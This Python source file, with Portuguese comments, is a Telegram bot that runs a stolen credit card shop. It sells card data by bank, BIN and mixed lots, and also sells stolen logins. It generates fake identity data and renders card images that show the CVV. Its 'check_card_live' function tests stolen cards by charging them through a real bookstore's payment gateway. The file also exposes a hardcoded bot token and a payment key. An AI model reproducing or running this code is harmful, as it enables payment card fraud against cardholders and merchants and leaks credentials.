import asyncio
import logging
import json
import os
import requests
import sqlite3
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import mercadopago
import random
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from PIL import Image, ImageDraw, ImageFont
import io
import re
from collections import defaultdict

# Configuration
BOT_TOKEN = "8833241012:AAEgWUMsSWNjYO091NGuTHbaXAUKlTqZVu0"
ADMIN_ID = 8833241012
MP_ACCESS_TOKEN = "DESGRAÇA DO TOKEN NAO E NESCESARIO COLOCA AKI SEU FILHA DA PUTA O BOT RESCEBE NO MANUAL OUVC COLOCA NO ALTOMATICO OK"
GROUP_USERNAME = "@blackoutbrbot"  # Usando username do grupo

# Mix pricing configuration
MIX_PRICES = {10: 20.0, 20: 40.0, 50: 100.0, 100: 200.0, 200: 400.0}

# Bank mapping for BINs - Brazilian banks with specific BINs
BANK_MAPPING = {
    # Itaú
    "406655": "Itaú",
    "409088": "Itaú",
    "411765": "Itaú",
    "448245": "Itaú",
    "479964": "Itaú",
    "482033": "Itaú",
    "5414": "Itaú",
    "5418": "Itaú",
    "5421": "Itaú",

    # Bradesco
    "402360": "Bradesco",
    "431675": "Bradesco",
    "453211": "Bradesco",
    "478747": "Bradesco",
    "491764": "Bradesco",
    "5432": "Bradesco",
    "5436": "Bradesco",

    # Banco do Brasil
    "400011": "Banco do Brasil",
    "400014": "Banco do Brasil",
    "400362": "Banco do Brasil",
    "455176": "Banco do Brasil",
    "491936": "Banco do Brasil",
    "5512": "Banco do Brasil",
    "5515": "Banco do Brasil",

    # Santander
    "404747": "Santander",
    "453226": "Santander",
    "491935": "Santander",
    "517091": "Santander",
    "5413": "Santander",
    "5416": "Santander",

    # Caixa
    "401178": "Caixa",
    "434235": "Caixa",
    "484406": "Caixa",
    "5505": "Caixa",
    "5506": "Caixa",

    # Nubank
    "526489": "Nubank",
    "529092": "Nubank",
    "531626": "Nubank",
    "532501": "Nubank",
    "5162": "Nubank",

    # Inter
    "415201": "Inter",
    "416684": "Inter",
    "423435": "Inter",
    "558563": "Inter",

    # BTG Pactual
    "434921": "BTG Pactual",
    "532653": "BTG Pactual",

    # C6 Bank
    "531285": "C6 Bank",
    "531483": "C6 Bank",

    # Generic Visa (fallback)
    "40": "Visa",
    "41": "Visa",
    "42": "Visa",
    "43": "Visa",
    "44": "Visa",
    "45": "Visa",
    "46": "Visa",
    "47": "Visa",
    "48": "Visa",
    "49": "Visa",

    # Generic Mastercard (fallback)
    "51": "Mastercard",
    "52": "Mastercard",
    "53": "Mastercard",
    "54": "Mastercard",
    "55": "Mastercard",
    "2221": "Mastercard",
    "2222": "Mastercard",
    "2223": "Mastercard",
    "2224": "Mastercard",
    "2225": "Mastercard",
    "2226": "Mastercard",
    "2227": "Mastercard",
    "2228": "Mastercard",
    "2229": "Mastercard",
    "223": "Mastercard",
    "224": "Mastercard",
    "225": "Mastercard",
    "226": "Mastercard",
    "227": "Mastercard",
    "228": "Mastercard",
    "229": "Mastercard",
    "23": "Mastercard",
    "24": "Mastercard",
    "25": "Mastercard",
    "26": "Mastercard",
    "270": "Mastercard",
    "271": "Mastercard",
    "2720": "Mastercard",

    # American Express
    "34": "American Express",
    "37": "American Express",

    # Discover
    "6011": "Discover",
    "622": "Discover",
    "64": "Discover",
    "65": "Discover",

    # Diners Club
    "30": "Diners Club",
    "36": "Diners Club",
    "38": "Diners Club",

    # JCB
    "35": "JCB",

    # Elo (Brazilian)
    "636368": "Elo",
    "438935": "Elo",
    "504175": "Elo",
    "451416": "Elo",
    "636297": "Elo",
    "5067": "Elo",
    "4389": "Elo",
    "5041": "Elo",
    "4514": "Elo",
    "4576": "Elo",
    "4011": "Elo",
}

# PIX rate limiting
PIX_COOLDOWN = 300  # 5 minutes in seconds
PIX_BLOCK_THRESHOLD = 3
PIX_BLOCK_DURATION = 86400  # 24 hours in seconds

# Store payment attempts
payment_attempts = defaultdict(list)

def get_bank_name(bin_code: str) -> str:
    """Get bank name from BIN code"""
    # Try exact match first
    if bin_code in BANK_MAPPING:
        return BANK_MAPPING[bin_code]

    # Try progressive matching
    for length in range(6, 0, -1):
        prefix = bin_code[:length]
        if prefix in BANK_MAPPING:
            return BANK_MAPPING[prefix]

    # If no match found, try first digit
    first_digit = bin_code[0]
    if first_digit in BANK_MAPPING:
        return BANK_MAPPING[first_digit]

    return f"Banco {bin_code}"

def generate_fake_data():
    """Generate fake auxiliary data"""
    first_names = [
        "João", "Maria", "Pedro", "Ana", "Carlos", "Lucia", "Rafael",
        "Fernanda", "Gabriel", "Camila", "Bruno", "Julia", "Marcos", "Amanda",
        "Diego", "Carolina", "Felipe", "Beatriz", "Ricardo", "Larissa", "John",
        "Mary", "Michael", "Sarah", "David", "Emma", "James", "Lisa", "Robert",
        "Jessica"
    ]
    last_names = [
        "Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira",
        "Alves", "Pereira", "Lima", "Gomes", "Costa", "Ribeiro", "Martins",
        "Carvalho", "Rocha", "Barbosa", "Melo", "Nascimento", "Araújo",
        "Moreira", "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
        "Miller", "Davis", "Rodriguez", "Martinez"
    ]

    first_name = random.choice(first_names)
    last_name = random.choice(last_names)

    # Generate CPF (fake but valid format)
    cpf = ''.join([str(random.randint(0, 9)) for _ in range(11)])
    cpf_formatted = f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"

    # Generate birth date (18-65 years old)
    birth_year = random.randint(1959, 2005)
    birth_month = random.randint(1, 12)
    birth_day = random.randint(1, 28)
    birth_date = f"{birth_day:02d}/{birth_month:02d}/{birth_year}"

    # Generate email
    email_domains = [
        "gmail.com", "hotmail.com", "yahoo.com", "outlook.com", "bol.com.br",
        "terra.com.br", "protonmail.com", "icloud.com"
    ]
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 999)}@{random.choice(email_domains)}"

    return {
        "name": f"{first_name} {last_name}",
        "cpf": cpf_formatted,
        "birth_date": birth_date,
        "email": email
    }

def get_bank_colors_and_design(bank_name: str) -> Dict:
    """Get bank-specific colors and design elements"""
    bank_designs = {
        "Itaú": {
            "gradient_start": "#FF8C00",
            "gradient_end": "#FF4500",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "itaú"
        },
        "Bradesco": {
            "gradient_start": "#CC092F",
            "gradient_end": "#8B0000",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "bradesco"
        },
        "Banco do Brasil": {
            "gradient_start": "#FFFF00",
            "gradient_end": "#FFD700",
            "text_color": "#000080",
            "accent_color": "#000080",
            "logo_text": "BANCO DO BRASIL"
        },
        "Santander": {
            "gradient_start": "#EC0000",
            "gradient_end": "#B71C1C",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "Santander"
        },
        "Caixa": {
            "gradient_start": "#0066CC",
            "gradient_end": "#003D7A",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "CAIXA"
        },
        "Nubank": {
            "gradient_start": "#8A05BE",
            "gradient_end": "#4A0E4E",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "Nu"
        },
        "Inter": {
            "gradient_start": "#FF6600",
            "gradient_end": "#CC4400",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "INTER"
        },
        "BTG Pactual": {
            "gradient_start": "#000000",
            "gradient_end": "#333333",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "BTG Pactual"
        },
        "Visa": {
            "gradient_start": "#1A1F71",
            "gradient_end": "#0B1426",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "VISA"
        },
        "Mastercard": {
            "gradient_start": "#EB001B",
            "gradient_end": "#FF5F00",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "Mastercard"
        },
        "American Express": {
            "gradient_start": "#006FCF",
            "gradient_end": "#003D7A",
            "text_color": "#FFFFFF",
            "accent_color": "#FFD700",
            "logo_text": "AMERICAN EXPRESS"
        }
    }

    default_design = {
        "gradient_start": "#2C3E50",
        "gradient_end": "#34495E",
        "text_color": "#FFFFFF",
        "accent_color": "#FFD700",
        "logo_text": bank_name
    }

    return bank_designs.get(bank_name, default_design)

def hex_to_rgb(hex_color: str) -> tuple:
    """Convert hex color to RGB tuple"""
    hex_color = hex_color.lstrip('#')
    return tuple(int(hex_color[i:i + 2], 16) for i in (0, 2, 4))

def generate_3d_card(card_data: Dict, user_data: Dict,
                     fake_data: Dict) -> io.BytesIO:
    """Generate a realistic 3D-style credit card image"""
    width, height = 850, 540
    bank_name = get_bank_name(card_data['number'][:6])
    design = get_bank_colors_and_design(bank_name)

    img = Image.new('RGB', (width, height), color='#000000')
    draw = ImageDraw.Draw(img)

    start_rgb = hex_to_rgb(design["gradient_start"])
    end_rgb = hex_to_rgb(design["gradient_end"])

    for i in range(height):
        ratio = i / height
        r = int(start_rgb[0] * (1 - ratio) + end_rgb[0] * ratio)
        g = int(start_rgb[1] * (1 - ratio) + end_rgb[1] * ratio)
        b = int(start_rgb[2] * (1 - ratio) + end_rgb[2] * ratio)
        draw.line([(0, i), (width, i)], fill=(r, g, b))

    shadow_offset = 8
    for i in range(shadow_offset):
        shadow_val = int(20 * (1 - i / shadow_offset))
        draw.rectangle([(5 + i, 5 + i), (width - 5 + i, height - 5 + i)],
                       outline=(shadow_val, shadow_val, shadow_val),
                       width=1)

    draw.rectangle([(8, 8), (width - 8, height - 8)],
                   outline='#FFFFFF',
                   width=2)

    try:
        bank_font = ImageFont.truetype(
            "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
        number_font = ImageFont.truetype(
            "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 38)
        name_font = ImageFont.truetype(
            "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 28)
        info_font = ImageFont.truetype(
            "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 20)
        small_font = ImageFont.truetype(
            "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 16)
    except:
        bank_font = ImageFont.load_default()
        number_font = ImageFont.load_default()
        name_font = ImageFont.load_default()
        info_font = ImageFont.load_default()
        small_font = ImageFont.load_default()

    draw.text((40, 40),
              design["logo_text"],
              fill=design["text_color"],
              font=bank_font)

    card_type = get_card_type(card_data['number'])
    card_type_width = draw.textlength(card_type, font=info_font)
    draw.text((width - card_type_width - 40, 40),
              card_type,
              fill=design["accent_color"],
              font=info_font)

    chip_x, chip_y = 70, 140
    chip_width, chip_height = 50, 40

    draw.rectangle([(chip_x, chip_y),
                    (chip_x + chip_width, chip_y + chip_height)],
                   fill='#D4AF37',
                   outline='#B8860B',
                   width=2)

    for i in range(3):
        for j in range(4):
            x = chip_x + 8 + i * 12
            y = chip_y + 6 + j * 7
            draw.rectangle([(x, y), (x + 8, y + 5)], fill='#B8860B')

    formatted_number = f"{card_data['number'][:4]} {card_data['number'][4:8]} {card_data['number'][8:12]} {card_data['number'][12:16]}"
    number_width = draw.textlength(formatted_number, font=number_font)
    number_x = (width - number_width) // 2
    draw.text((number_x, 250),
              formatted_number,
              fill=design["text_color"],
              font=number_font)

    cardholder_name = fake_data['name'].upper()
    draw.text((40, 350),
              "NOME DO PORTADOR",
              fill=design["accent_color"],
              font=small_font)
    draw.text((40, 375),
              cardholder_name,
              fill=design["text_color"],
              font=name_font)

    validity_text = f"{card_data['month']}/{card_data['year']}"
    draw.text((300, 350),
              "VÁLIDO ATÉ",
              fill=design["accent_color"],
              font=small_font)
    draw.text((300, 375),
              validity_text,
              fill=design["text_color"],
              font=name_font)

    draw.text((600, 350), "CVV", fill=design["accent_color"], font=small_font)
    draw.text((600, 375),
              card_data['cvv'],
              fill=design["text_color"],
              font=name_font)

    user_id_text = f"ID: {user_data['user_id']}"
    user_id_width = draw.textlength(user_id_text, font=small_font)
    draw.text((width - user_id_width - 20, height - 30),
              user_id_text,
              fill=design["accent_color"],
              font=small_font)

    for i in range(0, width + height, 30):
        start_x = max(0, i - height)
        start_y = max(0, height - i)
        end_x = min(width, i)
        end_y = min(height, height - (i - width)) if i > width else 0

        if start_x < width and end_x > 0:
            line_color = tuple(
                min(255, c + 15) for c in hex_to_rgb(design["gradient_end"]))
            draw.line([(start_x, start_y), (end_x, end_y)],
                      fill=line_color,
                      width=1)

    stripe_y = 100
    draw.rectangle([(0, stripe_y), (width, stripe_y + 25)], fill='#000000')
    draw.rectangle([(0, stripe_y + 2), (width, stripe_y + 23)], fill='#2C2C2C')

    if card_type in ['VISA', 'MASTERCARD']:
        symbol_x, symbol_y = 200, 140
        for i in range(3):
            radius = 15 + i * 8
            draw.arc([(symbol_x - radius, symbol_y - radius),
                      (symbol_x + radius, symbol_y + radius)],
                     start=0,
                     end=90,
                     fill=design["accent_color"],
                     width=2)

    img_bytes = io.BytesIO()
    img.save(img_bytes, format='PNG', quality=95)
    img_bytes.seek(0)

    return img_bytes

def get_card_type(card_number: str) -> str:
    """Get card type from number"""
    first_digit = card_number[0]
    first_two = card_number[:2]
    first_four = card_number[:4]

    if first_digit == '4':
        return 'VISA'
    elif first_digit == '5' or first_two in [
            '22', '23', '24', '25', '26', '27'
    ]:
        return 'MASTERCARD'
    elif first_two in ['34', '37']:
        return 'AMEX'
    elif first_four == '6011' or first_two == '65':
        return 'DISCOVER'
    elif first_two in ['30', '36', '38']:
        return 'DINERS'
    elif first_two == '35':
        return 'JCB'
    else:
        return 'CREDIT'

async def check_user_in_group(context: ContextTypes.DEFAULT_TYPE,
                              user_id: int) -> bool:
    """Check if user is in the required group"""
    try:
        # Use o username do grupo em vez do ID
        chat = await context.bot.get_chat(GROUP_USERNAME)
        member = await context.bot.get_chat_member(chat.id, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Erro ao verificar grupo: {e}")
        return False

# Database setup
def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            balance REAL DEFAULT 0.0,
            is_blocked INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credit_cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bin TEXT NOT NULL,
            bank_name TEXT NOT NULL,
            number TEXT UNIQUE NOT NULL,
            month TEXT NOT NULL,
            year TEXT NOT NULL,
            cvv TEXT NOT NULL,
            is_sold INTEGER DEFAULT 0,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bin_prices (
            bin TEXT PRIMARY KEY,
            price REAL NOT NULL DEFAULT 3.0
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS gifts (
            code TEXT PRIMARY KEY,
            amount REAL NOT NULL,
            is_used INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            used_by INTEGER DEFAULT NULL
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            type TEXT,
            amount REAL,
            description TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bot_settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS chat_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            first_name TEXT,
            message TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS affiliates (
            user_id INTEGER PRIMARY KEY,
            affiliate_code TEXT UNIQUE NOT NULL,
            referred_by INTEGER DEFAULT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            login TEXT UNIQUE NOT NULL,
            category TEXT NOT NULL,
            added_by INTEGER,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS chk_access (
            user_id INTEGER PRIMARY KEY,
            has_access INTEGER DEFAULT 0,
            expiry_time DATETIME DEFAULT NULL
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pix_payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            payment_id TEXT UNIQUE NOT NULL,
            amount REAL NOT NULL,
            status TEXT DEFAULT 'pending',
            qr_code TEXT,
            qr_code_base64 TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            confirmed_at TIMESTAMP DEFAULT NULL
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pix_attempts (
            user_id INTEGER PRIMARY KEY,
            attempts INTEGER DEFAULT 0,
            last_attempt TIMESTAMP,
            blocked_until TIMESTAMP DEFAULT NULL
        )
    ''')

    conn.commit()
    conn.close()

# Database helper functions
def get_user(user_id: int) -> Optional[Dict]:
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id, ))
    result = cursor.fetchone()
    conn.close()
    if result:
        return {
            'user_id': result[0],
            'username': result[1],
            'first_name': result[2],
            'balance': result[3],
            'is_blocked': result[4],
            'created_at': result[5]
        }
    return None

def create_user(user_id: int, username: str, first_name: str):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute(
        '''
        INSERT OR IGNORE INTO users (user_id, username, first_name) 
        VALUES (?, ?, ?)
    ''', (user_id, username, first_name))
    conn.commit()
    conn.close()

def update_balance(user_id: int, amount: float):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?',
                   (amount, user_id))
    conn.commit()
    conn.close()

def get_banks() -> List[Dict]:
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''
        SELECT bank_name, COUNT(*) as count 
        FROM credit_cards 
        WHERE is_sold = 0 
        GROUP BY bank_name
        ORDER BY bank_name
    ''')
    banks = []
    for row in cursor.fetchall():
        banks.append({'name': row[0], 'count': row[1]})
    conn.close()
    return banks

def get_bins_by_bank(bank_name: str) -> List[Dict]:
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute(
        '''
        SELECT bin, COUNT(*) as count 
        FROM credit_cards 
        WHERE bank_name = ? AND is_sold = 0
        GROUP BY bin
        ORDER BY bin
    ''', (bank_name, ))
    bins = []
    for row in cursor.fetchall():
        bins.append({'bin': row[0], 'count': row[1]})
    conn.close()
    return bins

def get_cards_by_bin(bin_code: str) -> List[Dict]:
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute(
        '''
        SELECT number, month, year, cvv FROM credit_cards 
        WHERE bin = ? AND is_sold = 0
        ORDER BY added_at DESC
    ''', (bin_code, ))
    cards = []
    for row in cursor.fetchall():
        cards.append({
            'number': row[0],
            'month': row[1],
            'year': row[2],
            'cvv': row[3]
        })
    conn.close()
    return cards

def get_random_cards_for_mix(quantity: int) -> List[Dict]:
    """Get random cards for mix purchase"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute(
        '''
        SELECT number, month, year, cvv, bin, bank_name FROM credit_cards 
        WHERE is_sold = 0
        ORDER BY RANDOM()
        LIMIT ?
    ''', (quantity, ))
    cards = []
    for row in cursor.fetchall():
        cards.append({
            'number': row[0],
            'month': row[1],
            'year': row[2],
            'cvv': row[3],
            'bin': row[4],
            'bank_name': row[5]
        })
    conn.close()
    return cards

def add_credit_card(number: str, month: str, year: str, cvv: str) -> bool:
    bin_code = number[:6]
    bank_name = get_bank_name(bin_code)

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()

    cursor.execute('SELECT number FROM credit_cards WHERE number = ?',
                   (number, ))
    if cursor.fetchone():
        conn.close()
        return False

    cursor.execute(
        '''
        INSERT INTO credit_cards (bin, bank_name, number, month, year, cvv) 
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (bin_code, bank_name, number, month, year, cvv))
    conn.commit()
    conn.close()
    return True

def mark_card_sold(number: str):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE credit_cards SET is_sold = 1 WHERE number = ?',
                   (number, ))
    conn.commit()
    conn.close()

def get_bin_price(bin_code: str) -> float:
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT price FROM bin_prices WHERE bin = ?', (bin_code, ))
    result = cursor.fetchone()
    conn.close()
    if result:
        return result[0]
    else:
        # Se não existe preço definido, seta como 3.0
        set_bin_price(bin_code, 3.0)
        return 3.0

def set_bin_price(bin_code: str, price: float):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute(
        '''
        INSERT OR REPLACE INTO bin_prices (bin, price) VALUES (?, ?)
    ''', (bin_code, price))
    conn.commit()
    conn.close()

def add_chat_message(user_id: int, username: str, first_name: str,
                     message: str):
    """Add message to global chat"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute(
        '''
        INSERT INTO chat_messages (user_id, username, first_name, message) 
        VALUES (?, ?, ?, ?)
    ''', (user_id, username, first_name, message))
    conn.commit()
    conn.close()

def get_recent_chat_messages(limit: int = 10) -> List[Dict]:
    """Get recent chat messages"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute(
        '''
        SELECT user_id, username, first_name, message, created_at 
        FROM chat_messages 
        ORDER BY created_at DESC 
        LIMIT ?
    ''', (limit, ))
    messages = []
    for row in cursor.fetchall():
        messages.append({
            'user_id': row[0],
            'username': row[1],
            'first_name': row[2],
            'message': row[3],
            'created_at': row[4]
        })
    conn.close()
    return list(reversed(messages))

def create_affiliate_code(user_id: int) -> str:
    """Generate unique affiliate code"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits,
                                  k=8)) + str(user_id)

def get_affiliate_link(bot_name: str, affiliate_code: str) -> str:
    """Generate affiliate link"""
    return f"https://t.me/{bot_name}?start={affiliate_code}"

def create_affiliate(user_id: int):
    """Create affiliate entry"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    affiliate_code = create_affiliate_code(user_id)
    cursor.execute(
        '''
        INSERT OR IGNORE INTO affiliates (user_id, affiliate_code)
        VALUES (?, ?)
    ''', (user_id, affiliate_code))
    conn.commit()
    conn.close()
    return affiliate_code

def get_affiliate(user_id: int) -> Optional[Dict]:
    """Get affiliate data"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM affiliates WHERE user_id = ?', (user_id, ))
    result = cursor.fetchone()
    conn.close()
    if result:
        return {
            'user_id': result[0],
            'affiliate_code': result[1],
            'referred_by': result[2],
            'created_at': result[3]
        }
    return None

# Login functions
def add_login(login: str, category: str, user_id: int) -> bool:
    """Add a login to the database."""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()

    cursor.execute('SELECT login FROM logins WHERE login = ?', (login,))
    if cursor.fetchone():
        conn.close()
        return False

    try:
        cursor.execute(
            '''
            INSERT INTO logins (login, category, added_by)
            VALUES (?, ?, ?)
            ''', (login, category, user_id))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Error adding login: {e}")
        conn.close()
        return False

def get_logins_by_category(category: str) -> List[Dict]:
    """Get logins by category."""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT login FROM logins WHERE category = ?', (category,))
    logins = []
    for row in cursor.fetchall():
        logins.append({'login': row[0]})
    conn.close()
    return logins

def get_login_categories() -> List[Dict]:
     conn = sqlite3.connect('bot_database.db')
     cursor = conn.cursor()
     cursor.execute('''
         SELECT category, COUNT(*) as count
         FROM logins
         GROUP BY category
         ORDER BY category
     ''')
     categories = []
     for row in cursor.fetchall():
         categories.append({'category': row[0], 'count': row[1]})
     conn.close()
     return categories

# CHK Access Functions
def has_chk_access(user_id: int) -> bool:
    """Check if user has CHK access and it's not expired."""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT has_access, expiry_time FROM chk_access WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()

    if result:
        has_access, expiry_time = result
        if has_access:
            if expiry_time:
                expiry_datetime = datetime.fromisoformat(expiry_time)
                return datetime.now() < expiry_datetime
            return True
    return False

def grant_chk_access(user_id: int, hours: int = None, days: int = None):
    """Grant CHK access to a user for a specified duration."""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()

    expiry_time = None
    if hours:
        expiry_time = datetime.now() + timedelta(hours=hours)
    elif days:
        expiry_time = datetime.now() + timedelta(days=days)

    if expiry_time:
        expiry_iso = expiry_time.isoformat()
        cursor.execute('''
            INSERT OR REPLACE INTO chk_access (user_id, has_access, expiry_time)
            VALUES (?, ?, ?)
        ''', (user_id, 1, expiry_iso))
    else:
        cursor.execute('''
            INSERT OR REPLACE INTO chk_access (user_id, has_access, expiry_time)
            VALUES (?, ?, NULL)
        ''', (user_id, 1, ))

    conn.commit()
    conn.close()

def revoke_chk_access(user_id: int):
    """Revoke CHK access from a user."""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE chk_access SET has_access = 0, expiry_time = NULL WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def check_card_live(cc: str, mm: str, yy: str, cvv: str) -> Dict:
    """Check if card is live using the API."""
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
        })
        
        add_cart_data = {
            'add_to_cart': '93954748',
            'quantity': '1',
            'zipcode': '',
            'variant_id': '357176402',
            'add_to_cart_enhanced': '1'
        }
        
        cart_response = session.post(
            'https://livrariacomcristo.com.br/comprar/',
            data=add_cart_data,
            headers={
                'accept': 'image/webp',
                'accept-language': 'pt-BR,pt;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://livrariacomcristo.com.br',
                'referer': 'https://livrariacomcristo.com.br/produtos/o-livro-de-enoque-apocrifo/'
            }
        )
        
        if not cart_response.ok:
            return {"status": "error", "message": "Failed to add to cart"}
        
        token_response = session.post(
            'https://api.mundipagg.com/core/v1/tokens?appId=pk_EBYX9rDh1Tv2qx23',
            json={
                'type': 'card',
                'card': {
                    'number': cc,
                    'holder_name': 'TESTE CARD',
                    'exp_month': int(mm),
                    'exp_year': int(yy),
                    'cvv': cvv
                }
            },
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
        )
        
        if not token_response.ok:
            return {"status": "declined", "message": "Card declined"}
        
        token_data = token_response.json()
        
        if 'id' not in token_data:
            return {"status": "declined", "message": "Invalid card data"}
        
        card_token = token_data['id']
        
        payment_data = {
            'amount': 3990,
            'currency': 'BRL',
            'payment_method': 'credit_card',
            'card': {
                'card_token': card_token,
                'statement_descriptor': 'LIVRARIA',
                'installments': 1
            },
            'customer': {
                'name': 'TESTE CARD',
                'email': 'teste@example.com',
                'document': '12345678901',
                'type': 'individual',
                'phones': {
                    'mobile_phone': {
                        'country_code': '55',
                        'area_code': '11',
                        'number': '999999999'
                    }
                }
            },
            'billing': {
                'name': 'TESTE CARD',
                'address': {
                    'country': 'BR',
                    'state': 'SP',
                    'city': 'São Paulo',
                    'zip_code': '01310-100',
                    'line_1': 'Av. Paulista, 1000'
                }
            }
        }
        
        payment_response = session.post(
            'https://api.mundipagg.com/core/v1/charges',
            json=payment_data,
            headers={
                'Authorization': 'Basic ' + 'cGtfRUJZWDlyRGgxVHYycXgyMzo=',
                'Content-Type': 'application/json'
            }
        )
        
        if payment_response.ok:
            result = payment_response.json()
            if result.get('status') == 'paid':
                return {"status": "approved", "message": "Card approved"}
            elif result.get('status') == 'pending':
                return {"status": "pending", "message": "Card pending"}
            else:
                gateway_response = result.get('last_transaction', {}).get('gateway_response', {})
                reason = gateway_response.get('reason', 'Declined')
                return {"status": "declined", "message": f"Card declined: {reason}"}
        else:
            return {"status": "declined", "message": "Payment failed"}
            
    except Exception as e:
        return {"status": "error", "message": f"Error: {str(e)}"}

# MercadoPago integration (mantido apenas por compatibilidade, não será mais usado)
def create_payment(amount: float, user_id: int) -> Dict:
    try:
        sdk = mercadopago.SDK(MP_ACCESS_TOKEN)

        payment_data = {
            "transaction_amount": amount,
            "description": f"Recarga de saldo - User {user_id}",
            "payment_method_id": "pix",
            "payer": {
                "email": f"user{user_id}@example.com"
            }
        }

        payment_response = sdk.payment().create(payment_data)
        return payment_response["response"]
    except Exception as e:
        print(f"Erro no MercadoPago: {e}")
        return {"status": "error"}

def check_payment_status(payment_id: str) -> str:
    try:
        sdk = mercadopago.SDK(MP_ACCESS_TOKEN)
        payment_response = sdk.payment().get(payment_id)
        return payment_response["response"]["status"]
    except:
        return "error"

